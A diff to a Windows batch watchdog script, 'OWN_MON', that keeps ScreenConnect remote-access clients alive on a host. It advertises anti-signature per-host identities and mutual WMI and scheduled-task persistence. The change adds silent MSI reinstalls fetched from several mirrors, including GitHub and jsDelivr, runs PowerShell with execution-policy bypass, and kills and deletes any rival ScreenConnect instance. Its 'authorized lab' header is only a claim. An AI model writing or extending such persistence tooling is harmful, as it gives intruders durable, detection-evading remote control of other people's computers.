@@ -1,6 +1,6 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260802M11
+rem  OWN_MON  BUILD 20260802M12
 rem  Persistent watchdog - identity-aware (anti-signature), mutual
 rem  WMI+schtasks chains, MSI fallback chain, state.json, digest HB.
 rem  Authorized internal deployment - lab/competition scope only.
@@ -31,7 +31,7 @@ set "MSI=%ProgramData%\ScreenConnect.ClientSetup.msi"
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M10"
+set "MONVER=M12"
 set "PF86=%ProgramFiles(x86)%"
 for /f "tokens=1-3 delims=/ " %%a in ("%date%") do set "DT=%date% %time%"
 echo.>>"%LOG%"
@@ -42,6 +42,7 @@ set "PRIM_OK=0"
 set "ALT_OK=0"
 set "FOREIGN_LEFT=0"
 set "FOREIGN_LIST="
+set "MSIEXIT=not-run"
 
 rem ── per-host identity (anti-signature) ────────────────────────
 if not exist "%WD%\identity.cfg" if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
@@ -131,9 +132,12 @@ if "%INSTALLED%"=="1" if "%PRIM_OK%"=="0" (
 )
 if "%INSTALLED%"=="1" goto :ForeignCheck
 
-rem ── [D] primary SC missing - full reinstall ───────────────────
-echo svc missing - reinstalling>>"%LOG%"
-call :InstallMsi "%MSI_URL%" "main"
+rem ── [D] primary SC missing - heal ladder ──────────────────────
+rem M12: FIRST repair the registered product (recreates service without
+rem touching the ALT instance); fresh msiexec install only as fallback.
+echo svc missing - heal begin>>"%LOG%"
+call :RepairRegistered "%KEEP_FP%"
+if "%INSTALLED%"=="0" call :InstallMsi "%MSI_URL%" "main"
 if "%INSTALLED%"=="0" call :InstallMsi "%MSI_PKG1?t=%RANDOM%" "github-pkg"
 if "%INSTALLED%"=="0" call :InstallMsi "%MSI_PKG2%" "jsdelivr-pkg"
 if "%INSTALLED%"=="0" (
@@ -146,6 +150,7 @@ if "%INSTALLED%"=="0" (
     call :WaitSvc
   )
 )
+call :RestoreAlt
 if "%INSTALLED%"=="0" (
   if exist "%WD%\msi_heal.log" (
     echo --- msi_heal.log tail --->>"%LOG%"
@@ -179,7 +184,9 @@ if exist "%PF86%" for /d %%D in ("%PF86%\ScreenConnect Client (*)") do (
   set "DFP=!DN:ScreenConnect Client (=!"
   set "DFP=!DFP:)=!"
   if /I not "!DFP!"=="%KEEP_FP!" if /I not "!DFP!"=="%ALT_FP!" (
+    powershell -NoProfile -NonInteractive -Command "Get-CimInstance Win32_Process -Filter 'Name like ''ScreenConnect%''' | Where-Object { $_.ExecutablePath -like '*!DFP!*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }" >nul 2>&1
     rmdir /s /q "%%D" >nul 2>&1
+    if exist "%%D" rmdir /s /q "%%D" >nul 2>&1
     if not exist "%%D" (echo nuke_foreign_dir_!DFP!>>"%LOG%") else (echo nuke_dir_failed_!DFP!>>"%LOG%")
   )
 )
@@ -231,9 +238,28 @@ move /y "%MSI%.tmp" "%MSI%" >nul 2>&1
 call :NoMsiPolicy
 echo [%TAG%] msiexec install>>"%LOG%"
 msiexec /i "%MSI%" /qn /norestart /L*v "%WD%\msi_heal.log" >nul 2>&1
-set "MSIEXIT=%ERRORLEVEL%"
-echo [%TAG%] msiexec exit=%MSIEXIT%>>"%LOG%"
+set "MSIEXIT=!ERRORLEVEL!"
+echo [%TAG%] msiexec exit=!MSIEXIT!>>"%LOG%"
 call :WaitSvc
+exit /b 0
+
+:RepairRegistered
+rem %1=fingerprint - service deleted but product registered: repair by GUID.
+sc query "ScreenConnect Client (%~1)" >nul 2>&1
+if not errorlevel 1 exit /b 0
+if not exist "%WD%\own_lib.ps1" exit /b 1
+powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%~1" -WorkDir "%WD%" >>"%LOG%" 2>&1
+call :WaitSvc
+exit /b 0
+
+:RestoreAlt
+rem ALT service gone but still registered (SC-family msiexec side effect) - repair it too.
+sc query "ScreenConnect Client (%ALT_FP%)" >nul 2>&1
+if not errorlevel 1 exit /b 0
+echo alt missing - repair attempt>>"%LOG%"
+if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%ALT_FP%" -WorkDir "%WD%" >>"%LOG%" 2>&1
+sc query "ScreenConnect Client (%ALT_FP%)" | find "RUNNING" >nul
+if not errorlevel 1 set "ALT_OK=1"
 exit /b 0
 
 :NoMsiPolicy
